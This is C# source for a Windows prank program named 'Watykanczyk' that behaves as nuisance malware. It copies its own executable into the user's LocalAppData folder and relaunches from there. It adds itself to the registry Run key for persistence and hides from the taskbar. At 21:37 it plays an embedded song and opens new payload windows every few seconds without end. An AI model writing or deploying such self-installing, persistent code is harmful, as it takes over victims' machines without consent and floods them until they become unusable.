using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Watykanczyk
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            CheckIfProgramShouldRun();

            try
            {
                // Ścieżka do aplikacji
                string appPath = $@"{AppDomain.CurrentDomain.BaseDirectory}watykanczyk.exe";

                // Nazwa aplikacji w autostarcie
                string appName = "Watykanczyk";

                // Dodanie klucza rejestru
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key.SetValue(appName, appPath);
                }

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

            InitializeComponent();

            this.ShowInTaskbar = false;

            Random r = new Random();

            Screen primaryScreen = Screen.PrimaryScreen;

            int w = primaryScreen.Bounds.Width;
            int h = primaryScreen.Bounds.Height;

            this.StartPosition = FormStartPosition.Manual;
            this.Location = new Point(w, h);

            Thread runPayload = new Thread(() =>
            {
                System.IO.Stream str = Properties.Resources.Barka;
                System.Media.SoundPlayer barka = new System.Media.SoundPlayer(str);
                barka.Play();

                while (true)
                {
                    StartNewThread();
                    Thread.Sleep(r.Next(2000, 5000));
                }
            });


            while (true)
            {
                DateTime currentTime = DateTime.Now;

                int currentHour = currentTime.Hour;
                int currentMinute = currentTime.Minute;

                string time = ($"{currentHour}:{currentMinute}");

                if (time == "21:37")
                {
                    runPayload.Start();
                    break;
                }
            }
        }

        private void StartNewThread()
        {
            Thread payload = new Thread(() =>
            {
                PayloadForm payloadForm = new PayloadForm();

                Application.Run(payloadForm);
            });
            payload.SetApartmentState(ApartmentState.STA);
            payload.Start();
        }

        private void BtnTest_Click(object sender, EventArgs e)
        {
            StartNewThread();
        }

        private void CheckIfProgramShouldRun()
        {
            string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            Console.WriteLine(localAppDataPath);

            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string exeName = Path.GetFileName(exePath);

            string targetPath = $@"{localAppDataPath}\";
            string currentPath = $@"{AppDomain.CurrentDomain.BaseDirectory}";
            string exePlusTargetPath = $"{targetPath}{exeName}";
            string exePlusCurrentPath = $"{currentPath}{exeName}";

            if (currentPath != targetPath)
            {
                if (File.Exists(exePlusTargetPath))
                {
                    Process process = new Process();
                    process.StartInfo.FileName = exePlusTargetPath;
                    process.Start();
                    Environment.Exit(0);
                }
                else
                {
                    File.Copy(exePlusCurrentPath, exePlusTargetPath);
                    Process process = new Process();
                    process.StartInfo.FileName = exePlusTargetPath;
                    process.Start();
                    Environment.Exit(0);
                }
            }
        }
    }
}
